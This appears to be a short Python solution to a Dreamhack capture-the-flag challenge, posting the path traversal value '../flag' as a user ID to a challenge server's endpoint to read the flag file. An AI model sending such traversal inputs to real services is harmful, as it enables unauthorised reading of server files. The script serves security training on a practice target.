import requests

# HTML 파일에 적힌 URL입니다.
url = "http://host8.dreamhack.games:23022/get_info" 

data = {
    "userid": "../flag"
}

response = requests.post(url, data=data)
print(response.text)